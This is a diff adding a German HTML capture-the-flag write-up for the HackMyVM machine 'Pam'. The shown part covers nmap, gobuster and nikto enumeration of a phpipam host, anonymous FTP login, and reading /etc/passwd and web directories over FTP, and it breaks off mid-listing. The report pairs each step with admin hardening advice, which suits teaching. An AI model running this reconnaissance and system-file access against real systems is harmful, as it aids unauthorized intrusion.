@@ -1,3 +1,1119 @@
-﻿ 
-        <h1>Pam ist in arbeit</h1>
-       
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pam - Hackmyvm - Medium - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Pam - Hackmyvm - Level: Medium - Bericht</h1>
+        <div class="level-container">
+            <h2>Medium</h2>
+            <div class="circle">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">ftp</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">mysql / MariaDB</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">ss</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">feh</div>
+                <div class="tool-item">openssl</div>
+                <div class="tool-item">python3</div>
+                <div class="tool-item">stty</div>
+                <div class="tool-item">CyberChef</div>
+                <div class="tool-item">Base64.guru</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#proof-of-concept">Proof of Concept</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Die Phase der Aufklärung (Reconnaissance) ist der erste und grundlegende Schritt jedes Penetrationstests. Sie dient dazu, Informationen über das Zielsystem zu sammeln, um potenzielle Angriffsvektoren zu identifizieren. In diesem Fall begann ich mit der Identifizierung der Ziel-IP-Adresse im lokalen Netzwerk.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Eine gründliche Aufklärung ist entscheidend für den Erfolg eines Penetrationstests. Durch das systematische Vorgehen kann ich einen umfassenden Überblick über die Netzwerktopologie und die aktiven Systeme erhalten. Die Methode mit `arp-scan` ist hierfür sehr effektiv in einem lokalen Segment.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Immer mit einer passiven oder aktiven Aufklärung beginnen, um die Ziel-IP zu bestimmen. Tools wie `arp-scan` oder `netdiscover` sind hierfür ideal. <br>
+                <strong>Empfehlung (Admin):</strong> Implementierung von Netzwerksegmentierung und Access Control Lists (ACLs), um die Sichtbarkeit von internen Systemen zu minimieren und unautorisierte Scans zu erschweren.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">arp-scan -l | grep "PCS" | awk '{print $1}'</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">192.168.2.195</span></pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Nachdem die Ziel-IP-Adresse <code>192.168.2.195</code> erfolgreich identifiziert wurde, ist es üblich, einen lesbaren Hostnamen für das Ziel festzulegen. Dies erleichtert die weitere Arbeit im Terminal, da ich mich nicht ständig an die IP-Adresse erinnern muss. Ich fügte den Eintrag <code>pam.hmv</code> zur lokalen <code>/etc/hosts</code>-Datei hinzu.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Hinzufügen von Hostnamen in der <code>/etc/hosts</code>-Datei ist eine bewährte Praxis im Pentesting. Es verbessert die Lesbarkeit der Befehle und Ausgaben erheblich und simuliert die Namensauflösung in einer realen Produktionsumgebung.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutzen Sie stets Hostnamen in der <code>/etc/hosts</code>-Datei, um die Übersichtlichkeit zu verbessern und Tippfehler zu vermeiden. <br>
+                <strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass interne DNS-Server korrekt konfiguriert sind und nur autorisierte Hosts auf Namensauflösung zugreifen können, um die Informationsbeschaffung für Angreifer zu erschweren.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command"> 192.168.2.195   pam.hmv</span></pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Im nächsten Schritt führte ich einen umfassenden Portscan mit Nmap durch, um offene Dienste und deren Versionen auf dem Zielsystem zu identifizieren. Der Befehl <code>nmap -sS -sC -sV -p- -T5 -AO pam.hmv</code> ist eine aggressive, aber sehr effektive Methode, um schnell einen Überblick über alle offenen TCP-Ports, Standard-Skripte und Service-Versionen zu erhalten. Das <code>grep open</code> filtert die Ausgabe, um nur die wirklich offenen Ports anzuzeigen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Nmap-Scan bestätigte, dass zwei kritische Dienste offen sind: FTP auf Port 21 (vsFTPd 3.0.3) und HTTP auf Port 80 (nginx 1.18.0). Diese Dienste sind häufige Angriffsziele und werden daher im weiteren Verlauf des Pentests genauer untersucht. Die schnelle Identifizierung dieser Dienste ist ein Erfolg der Aufklärungsphase.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Führen Sie immer umfassende Portscans durch, um alle potenziell angreifbaren Dienste zu entdecken. Nutzen Sie die verschiedenen Nmap-Optionen (z.B. <code>-sC</code> für Skripte, <code>-sV</code> für Versionen), um detaillierte Informationen zu sammeln. <br>
+                <strong>Empfehlung (Admin):</strong> Deaktivieren Sie nicht benötigte Dienste und schließen Sie ungenutzte Ports auf der Firewall. Halten Sie alle Dienste, insbesondere öffentlich zugängliche wie FTP und Webserver, stets auf dem neuesten Stand, um bekannte Schwachstellen zu mitigieren.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nmap -sS -sC -sV -p- -T5 -AO pam.hmv | grep open</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">21/tcp open  ftp     vsftpd 3.0.3</span>
+<span class="command">80/tcp open  http    nginx 1.18.0</span></pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Hier ist die vollständige Ausgabe des Nmap-Scans. Sie liefert nicht nur die offenen Ports und Dienstversionen, sondern auch weitere wichtige Details wie das Betriebssystem (Linux 4.X|5.X) und die MAC-Adresse. Die <code>TRACEROUTE</code>-Information bestätigt, dass das Ziel direkt im lokalen Netzwerk erreichbar ist.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die detaillierte Nmap-Ausgabe ist eine Goldgrube an Informationen. Das Wissen über die spezifischen Versionen von vsFTPd und Nginx ermöglicht es mir, gezielt nach bekannten Schwachstellen für diese Software zu suchen. Die OS-Erkennung gibt einen ersten Hinweis auf das zugrunde liegende Betriebssystem, was bei der Auswahl geeigneter Exploits hilfreich ist.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Analysieren Sie die vollständige Nmap-Ausgabe sorgfältig auf alle Informationen, nicht nur die offenen Ports. Jedes Detail kann einen Hinweis auf weitere Schwachstellen geben. Nutzen Sie die identifizierten Softwareversionen für gezielte Schwachstellensuchen (z.B. auf Exploit-DB). <br>
+                <strong>Empfehlung (Admin):</strong> Führen Sie regelmäßige Vulnerability Scans auf Ihre Systeme durch, um offene Ports und veraltete Software zu identifizieren. Stellen Sie sicher, dass keine sensiblen Informationen über Nmap-Scans preisgegeben werden, indem Sie z.B. unnötige Dienste deaktivieren oder Firewalls korrekt konfigurieren. Überprüfen Sie auch die Konfiguration von FTP-Servern auf die Möglichkeit des anonymen Zugriffs, da dies ein häufiger Vektor für Initial Access sein kann.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nmap -sS -sC -sV -p- -T5 -AO pam.hmv</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+Starting Nmap <span class="command">7.95</span> ( [Link: https://nmap.org | Ziel: https://nmap.org] ) at <span class="command">2025-05-19 22:45 CEST</span>
+Nmap scan report for <span class="command">pam.hmv (192.168.2.195)</span>
+Host is up (0.00014s latency).
+Not shown: 65533 closed tcp PORTs (reset)
+PORT   STATE SERVICE VERSION
+<span class="command">21/tcp open  ftp     vsftpd 3.0.3</span>
+<span class="command">80/tcp open  http    nginx 1.18.0</span>
+|_http-server-header: <span class="command">nginx/1.18.0</span>
+|_http-title: <span class="command">Site doesn't have a title (text/html)</span>.
+MAC Address: <span class="command">08:00:27:AF:74:95</span> (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+Device type: <span class="command">general purpose|router</span>
+Running: <span class="command">Linux 4.X|5.X, MikroTik RouterOS 7.X</span>
+OS CPE: <span class="command">cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3</span>
+OS details: <span class="command">Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)</span>
+Network Distance: <span class="command">1 hop</span>
+Service Info: OS: <span class="command">Unix</span>
+
+TRACEROUTE
+HOP RTT     ADDRESS
+<span class="command">1   0.14 ms pam.hmv (192.168.2.195)</span>
+
+OS and Service detection performed. Please report any incorrect results at [Link: https://nmap.org/submit/ | Ziel: https://nmap.org/submit/].
+Nmap done: <span class="command">1 IP address (1 host up) scanned in 12.53 seconds</span></pre>
+                </div>
+            </div>
+        </section>
+		        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Nachdem wir festgestellt haben, dass ein Nginx-Webserver auf Port 80 läuft, ist der nächste logische Schritt die Web-Enumeration. Ich verwende <code>gobuster</code>, um Verzeichnisse und Dateien auf dem Webserver zu finden. Mit der Option <code>-p-</code> wird ein vollständiger Portscan von 1 bis 65535 durchgeführt, um wirklich alle offenen Ports zu identifizieren. Das Angeben einer umfangreichen Wortliste und vieler Dateierweiterungen (`-x`) erhöht die Wahrscheinlichkeit, versteckte oder unübliche Dateien zu finden. Die Filterung von Status-Codes wie <code>503, 404, 403</code> (`-b`) hilft, "Noise" aus der Ausgabe zu entfernen und sich auf relevante Funde zu konzentrieren.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Gobuster-Scan war in dieser Phase überraschend unergiebig. Es wurde lediglich <code>index.html</code> gefunden, was ein ungewöhnlich kleines Ergebnis für einen produktiven Webserver ist. Dies könnte auf eine starke Filterung, eine unkonventionelle Webanwendungsstruktur oder das Fehlen gängiger Dateinamen hindeuten. Dies ist ein wichtiger Hinweis, dass wir unsere Enumerationsstrategie gegebenenfalls anpassen müssen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Führen Sie immer eine umfassende Verzeichnis- und Dateiaufzählung durch. Bei geringen Treffern sollten Sie die Wortliste wechseln, die Dateierweiterungen anpassen, auf alternative Tools wie <code>dirb</code> oder <code>wfuzz</code> umsteigen oder die Filterung der Status-Codes neu bewerten. Eine manuelle Überprüfung der gefundenen Seiten ist ebenfalls essenziell. <br>
+                <strong>Empfehlung (Admin):</strong> Implementieren Sie robuste Web Application Firewalls (WAFs) und Intrusion Prevention Systeme (IPS), um Brute-Force-Angriffe auf Verzeichnisse zu erkennen und zu blockieren. Konfigurieren Sie den Webserver so, dass sensitive Verzeichnisse und Dateien nicht öffentlich zugänglich sind oder eine starke Authentifizierung erfordern.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">gobuster dir -u "http://pam.hmv" -w "/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt" -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx,bak,svg,pem,crt,json,conf,ELF,elf,c,java,lib,cgi,csh,config,deb,desc,exp,eps,diff,icon,mod,ln,old,rpm,js.map,pHtml -b '503,404,403' -e --no-error -k</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+===============================================================
+Gobuster v3.6
+by OJ Reeves (<span class="command">@TheColonial</span>) & Christian Mehlmauer (<span class="command">@firefart</span>)
+===============================================================
+[+] Url:                     <span class="command">http://pam.hmv</span>
+[+] Method:                  <span class="command">GET</span>
+[+] Threads:                 <span class="command">10</span>
+[+] Wordlist:                <span class="command">/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</span>
+[+] Negative Status codes:   <span class="command">503,404,403</span>
+[+] User Agent:              <span class="command">gobuster/3.6</span>
+[+] Extensions:              <span class="command">tar,accdb,crt,pl,bak,ELF,deb,mod,icon,doc,py,gz,json,kdbx,java,exe,js.map,xls,jpeg,csh,asp,aspx,pem,conf,desc,php,html,phtml,raw,cgi,ln,old,pHtml,pub,docx,sh,png,xlsx,rpm,db,ps1,jpg,dll,elf,xml,rtf,lib,diff,txt,pdf,config,sql,bat,svg,exp,rar,zip,c,eps,mdb,csv</span>
+[+] Expanded:                <span class="command">true</span>
+[+] Timeout:                 <span class="command">10s</span>
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+<span class="command">http://pam.hmv/index.html           (Status: 200) [Size: 18]</span></pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Die Ausgabe des <code>index.html</code> war mit nur 18 Bytes sehr kurz. Ein direkter Besuch der URL im Browser zeigte lediglich den Text "phpipam is ready.", was auf eine Installation der phpipam-Software hinweist. Dies ist ein wichtiger Fund, da phpipam eine bekannte Open-Source-IP-Adressverwaltungslösung ist, die in der Vergangenheit Schwachstellen aufwies.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Entdeckung von "phpipam is ready." ändert die Herangehensweise erheblich. Anstatt generische Web-Enumeration fortzusetzen, kann ich mich nun auf bekannte Schwachstellen in phpipam konzentrieren. Dies bestätigt die Notwendigkeit, jede gefundene Webressource zu analysieren, auch wenn der Gobuster-Output minimal ist.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Untersuchen Sie jeden HTTP-Status-200-Fund, egal wie klein. Manchmal sind die Informationen im Inhalt wichtiger als die Verzeichnisstruktur. Identifizieren Sie die genaue Version der Webanwendung (z.B. durch Suchen nach "phpipam version" oder in der Dokumentation), um gezielt nach Exploits zu suchen. <br>
+                <strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass öffentlich zugängliche Webserver nur die unbedingt notwendigen Informationen preisgeben. Generische "Ready"-Meldungen von installierter Software sind eine Form von Informationslecks, die Angreifern helfen können, gezielte Angriffe durchzuführen.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">http://pam.hmv/index.html</span>
+
+
+<span class="command">phpipam is ready.</span></pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Parallel zum Gobuster-Scan habe ich <code>nikto</code> verwendet, um den Webserver auf allgemeine Schwachstellen und Fehlkonfigurationen zu überprüfen. Die Option <code>-C all</code> weist Nikto an, alle verfügbaren CGI- und Server-Scans durchzuführen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Nikto lieferte wichtige Hinweise: Das Fehlen von <code>X-Frame-Options</code> und <code>X-Content-Type-Options</code> Headern sind Sicherheitslücken, die Cross-Site Request Forgery (CSRF) und MIME-Type Sniffing ermöglichen könnten. Der Fund von <code>#wp-config.php#</code> ist besonders kritisch, da diese Datei oft Datenbank-Anmeldedaten enthält. Obwohl es sich hierbei um eine WordPress-spezifische Datei handelt und wir es mit phpipam zu tun haben, ist das Muster eines versuchten Zugriffs auf Konfigurationsdateien relevant. Es zeigt, dass Nikto hier auf generische Muster prüft, die auch auf anderen Systemen relevant sein könnten, selbst wenn der Dateiname selbst nicht direkt zutrifft.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Verwenden Sie mehrere Web-Scanner wie Nikto und Zap/Burp Suite, um ein umfassendes Bild potenzieller Schwachstellen zu erhalten. Beachten Sie auch generische Warnungen, die auf die allgemeine Sicherheitshaltung des Servers hinweisen. <br>
+                <strong>Empfehlung (Admin):</strong> Implementieren Sie unbedingt alle relevanten HTTP-Sicherheits-Header (z.B. X-Frame-Options, X-Content-Type-Options, Content-Security-Policy). Überprüfen Sie Ihre Webserver-Konfigurationen regelmäßig auf versehentlich öffentlich zugängliche Konfigurationsdateien oder Backups.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nikto -h http://pam.hmv -C all</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+- Nikto <span class="command">v2.5.0</span>
+---------------------------------------------------------------------------
++ Target IP:          <span class="command">192.168.2.195</span>
++ Target Hostname:    <span class="command">pam.hmv</span>
++ Target PORT:        <span class="command">80</span>
++ Start Time:         <span class="command">2025-05-19 22:45:57 (GMT2)</span>
+---------------------------------------------------------------------------
++ Server: <span class="command">nginx/1.18.0</span>
++ /: <span class="command">The anti-clickjacking X-Frame-Options header is not present. See: [Link: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options | Ziel: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options]</span>
++ /: <span class="command">The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: [Link: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/ | Ziel: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/]</span>
++ /<span class="command">#wp-config.php#</span>: <span class="command">#wp-config.php# file found. This file contains the credentials.</span>
++ <span class="command">26500 requests: 0 error(s) and 3 item(s) reported on remote host</span>
++ End Time:           <span class="command">2025-05-19 22:46:39 (GMT2) (42 seconds)</span>
+---------------------------------------------------------------------------
++ <span class="command">1 host(s) tested</span></pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Nachdem die Web-Enumeration keine sofortigen offensichtlichen Angriffsvektoren lieferte, habe ich beschlossen, den FTP-Dienst genauer zu untersuchen, der auf Port 21 läuft. Das Protokoll `ftp` ist oft anfällig für anonyme Anmeldungen oder Brute-Force-Angriffe. Ich habe versucht, mich anonym anzumelden.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Fantastisch! Die anonyme Anmeldung am FTP-Server war erfolgreich! Dies ist ein kritischer Fund, da ein anonymer FTP-Zugriff oft das Lesen oder sogar Schreiben von Dateien auf dem Server ermöglicht. Das System erlaubt mir, mich als Benutzer `anonymous` anzumelden, was ein erhebliches Sicherheitsrisiko darstellt.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Prüfen Sie immer auf anonymen Zugriff bei FTP-Diensten. Dies ist ein häufiger initialer Angriffsvektor. Nach erfolgreicher Anmeldung sollte sofort nach interessanten Dateien (Konfigurationen, Credentials, Upload-Verzeichnisse) gesucht werden. <br>
+                <strong>Empfehlung (Admin):</strong> Deaktivieren Sie den anonymen FTP-Zugriff, es sei denn, er ist geschäftskritisch und die Risiken sind vollständig verstanden und mitigiert. Konfigurieren Sie FTP-Server so, dass nur autorisierte Benutzer mit starken Anmeldedaten Zugriff haben und ihre Berechtigungen auf das Notwendigste beschränkt sind.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">ftp 192.168.2.195</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+Connected to <span class="command">192.168.2.195</span>.
+<span class="command">220 (vsFTPd 3.0.3)</span>
+Name (<span class="command">192.168.2.195:ccat</span>): <span class="password">anonymous</span>
+<span class="command">331 Please specify the password.</span>
+Password:
+<span class="command">230 Login successful.</span>
+Remote system type is <span class="command">UNIX</span>.
+Using <span class="command">binary</span> mode to transfer files.
+ftp> <span class="command">ls -la</span>
+<span class="command">229 Entering Extended Passive Mode (|||63836|)</span>
+<span class="command">150 Here comes the directory listing.</span>
+<span class="command">drwxr-xr-x    2 1001     1001         4096 Aug 18  2022 .</span>
+<span class="command">drwxr-xr-x    4 0        0            4096 Aug 18  2022 ..</span>
+<span class="command">-rw-r--r--    1 1001     1001          220 Aug 18  2022 .bash_logout</span>
+<span class="command">-rw-r--r--    1 1001     1001         3526 Aug 18  2022 .bashrc</span>
+<span class="command">-rw-r--r--    1 1001     1001          807 Aug 18  2022 .profile</span>
+<span class="command">226 Directory send OK.</span>
+ftp> <span class="command">cd /var/www</span>
+<span class="command">250 Directory successfully changed.</span>
+ftp> <span class="command">ls -la</span>
+<span class="command">229 Entering Extended Passive Mode (|||64397|)</span>
+<span class="command">150 Here comes the directory listing.</span>
+<span class="command">drwxr-xr-x    3 0        0            4096 Aug 18  2022 .</span>
+<span class="command">drwxr-xr-x   12 0        0            4096 Aug 18  2022 ..</span>
+<span class="command">drwxr-xr-x    3 0        0            4096 Aug 18  2022 html</span>
+<span class="command">226 Directory send OK.</span></pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Nachdem ich den anonymen FTP-Zugriff bestätigt hatte, versuchte ich sofort, die Datei <code>/etc/passwd</code> herunterzuladen. Diese Datei enthält eine Liste der Benutzerkonten auf dem System und kann, auch wenn sie keine Passwörter enthält (sondern nur deren Hashes in <code>/etc/shadow</code>), wertvolle Informationen über vorhandene Benutzer und deren UIDs liefern.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Download von <code>/etc/passwd</code> war ein voller Erfolg! Dies bestätigt eine schwerwiegende Fehlkonfiguration des FTP-Servers oder der Dateiberechtigungen. Das Auslesen von Systemdateien wie <code>/etc/passwd</code> ist ein großes Informationsleck, das Angreifern hilft, Benutzerkonten zu identifizieren und potenzielle Angriffsziele zu finden. In der <code>/etc/passwd</code> Datei konnte ich den Benutzer <code>italia</code> mit der UID <code>1000</code> identifizieren. Dies ist ein wichtiger Hinweis für die weitere Privilegien-Eskalation.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Prüfen Sie bei anonymem FTP-Zugriff immer, welche Dateien gelesen werden können. Das Herunterladen von <code>/etc/passwd</code> ist ein Standardverfahren, um Benutzerinformationen zu sammeln. Suchen Sie anschließend nach weiteren Konfigurationsdateien oder Anmeldedaten. <br>
+                <strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass keine Systemdateien über FTP (auch nicht anonym) zugänglich sind. Konfigurieren Sie Dateiberechtigungen restriktiv (Least Privilege Principle). Überprüfen Sie, ob <code>/etc/passwd</code> nicht auch aus anderen Quellen (z.B. durch Web-Directory-Listing) zugänglich ist.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+ftp> <span class="command">get /etc/passwd</span>
+local: <span class="command">/etc/passwd</span> remote: <span class="command">/etc/passwd</span>
+<span class="command">229 Entering Extended Passive Mode (|||35079|)</span>
+<span class="command">150 Opening BINARY mode data connection for /etc/passwd (1557 bytes).</span>
+<span class="command">100% |*************************************************|  1557       19.79 MiB/s    00:00 ETA</span>
+<span class="command">226 Transfer complete.</span>
+<span class="command">1557 bytes received in 00:00 (3.77 MiB/s)</span></pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich setzte die Enumeration über FTP fort, indem ich zum <code>/home</code>-Verzeichnis wechselte und dessen Inhalt listete. Das Ziel ist es, Benutzerverzeichnisse und potenziell interessante Dateien zu finden, die weitere Informationen liefern könnten. Es ist entscheidend, jeden zugänglichen Pfad gründlich zu prüfen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Im <code>/home</code>-Verzeichnis fand ich das Verzeichnis <code>italia</code>, was auf einen weiteren Benutzer auf dem System hindeutet. Das anonyme Verzeichnis ist ebenfalls vorhanden. Obwohl die Dateien <code>pazz.php</code> und <code>user.txt</code> im Verzeichnis <code>/home/italia/</code> interessant erscheinen, scheiterte der direkte Download über FTP mit einer "Failed to open file"-Meldung. Dies deutet auf restriktivere Berechtigungen in diesem spezifischen Unterverzeichnis hin, auch wenn die Verzeichnisse selbst sichtbar sind. Dies ist eine Teilerfolg, da wir den Benutzer <code>italia</code> identifizieren konnten. Die Unfähigkeit, die Dateien direkt herunterzuladen, erfordert einen alternativen Ansatz.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Wenn ein direkter Download fehlschlägt, prüfen Sie alternative Zugangswege oder Berechtigungen. Manchmal sind Dateien über andere Dienste (z.B. Webserver) lesbar, auch wenn FTP fehlschlägt. Notieren Sie alle entdeckten Benutzernamen. <br>
+                <strong>Empfehlung (Admin):</strong> Implementieren Sie das Prinzip der geringsten Rechte (Least Privilege) für alle Dateiberechtigungen. Stellen Sie sicher, dass Benutzerdaten und sensitive Dateien nicht über Dienste wie FTP zugänglich sind, selbst wenn die Verzeichnisse selbst sichtbar sein müssen.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+ftp> <span class="command">cd /home</span>
+<span class="command">250 Directory successfully changed.</span>
+ftp> <span class="command">ls -la</span>
+<span class="command">229 Entering Extended Passive Mode (|||64539|)</span>
+<span class="command">150 Here comes the directory listing.</span>
+<span class="command">drwxr-xr-x    4 0        0            4096 Aug 18  2022 .</span>
+<span class="command">drwxr-xr-x   18 0        0            4096 Aug 18  2022 ..</span>
+<span class="command">drwxr-xr-x    2 1001     1001         4096 Aug 18  2022 anonymous</span>
+<span class="command">drwxr-xr-x    3 1000     1000         4096 Aug 18  2022 italia</span>
+<span class="command">226 Directory send OK.</span>
+ftp> <span class="command">cd /home/italia/</span>
+<span class="password">pazz.php	user.txt</span>
+ftp> <span class="command">cd /home/italia/</span>
+<span class="command">250 Directory successfully changed.</span>
+ftp> <span class="command">get user.txt</span>
+local: <span class="command">user.txt</span> remote: <span class="command">user.txt</span>
+<span class="command">229 Entering Extended Passive Mode (|||41814|)</span>
+<span class="command">550 Failed to open file.</span>
+ftp> <span class="command">get pazz.php</span>
+local: <span class="command">pazz.php</span> remote: <span class="command">pazz.php</span>
+<span class="command">229 Entering Extended Passive Mode (|||34036|)</span>
+<span class="command">550 Failed to open file.</span>
+ftp> <span class="command">cd /var/www/html</span>
+<span class="command">250 Directory successfully changed.</span>
+ftp> <span class="command">ls -la</span>
+<span class="command">229 Entering Extended Passive Mode (|||27758|)</span>
+<span class="command">150 Here comes the directory listing.</span>
+<span class="command">drwxr-xr-x    3 0        0            4096 Aug 18  2022 .</span>
+<span class="command">drwxr-xr-x    3 0        0            4096 Aug 18  2022 ..</span>
+<span class="command">-rw-r--r--    1 33       33             18 Aug 18  2022 index.html</span>
+<span class="command">drwxr-xr-x   12 33       33           4096 Aug 18  2022 phpipam</span>
+<span class="command">226 Directory send OK.</span>
+ftp> <span class="command">cd phpipam</span>
+<span class="command">250 Directory successfully changed.</span>
+ftp> <span class="command">ls -la</span>
+<span class="command">229 Entering Extended Passive Mode (|||47972|)</span>
+<span class="command">150 Here comes the directory listing.</span>
+<span class="command">drwxr-xr-x   12 33       33           4096 Aug 18  2022 .</span>
+<span class="command">drwxr-xr-x    3 0        0            4096 Aug 18  2022 ..</span>
+<span class="command">-rw-r--r--    1 33       33            282 May 02  2022 .htaccess</span>
+<span class="command">-rw-r--r--    1 33       33            111 May 02  2022 INSTALL.txt</span>
+<span class="command">-rw-r--r--    1 33       33           2236 May 02  2022 README.md</span>
+<span class="command">-rw-r--r--    1 33       33            941 May 02  2022 SECURITY.md</span>
+<span class="command">-rw-r--r--    1 33       33            105 May 02  2022 UPDATE</span>
+<span class="command">drwxr-xr-x    3 33       33           4096 May 02  2022 api</span>
+<span class="command">drwxr-xr-x   16 33       33           4096 May 02  2022 app</span>
+<span class="command">-rw-r--r--    1 33       33           2715 May 02  2022 config.docker.php</span>
+<span class="command">-rw-r--r--    1 33       33           7121 Aug 18  2022 config.php</span>
+<span class="command">drwxr-xr-x    8 33       33           4096 May 02  2022 css</span>
+<span class="command">drwxr-xr-x    4 33       33           4096 May 02  2022 db</span>
+<span class="command">drwxr-xr-x    5 33       33           4096 May 02  2022 doc</span>
+<span class="command">drwxr-xr-x   17 33       33           4096 May 02  2022 functions</span>
+<span class="command">-rw-r--r--    1 33       33          14051 May 02  2022 index.php</span>
+<span class="command">drwxr-xr-x    2 33       33           4096 May 02  2022 install</span>
+<span class="command">drwxr-xr-x    7 33       33           4096 May 02  2022 js</span>
+<span class="command">drwxr-xr-x    2 33       33           4096 May 02  2022 misc</span>
+<span class="command">-rw-r--r--    1 33       33             26 May 02  2022 robots.txt</span>
+<span class="command">drwxr-xr-x    2 33       33           4096 May 02  2022 upgrade</span>
+<span class="command">226 Directory send OK.</span></pre>
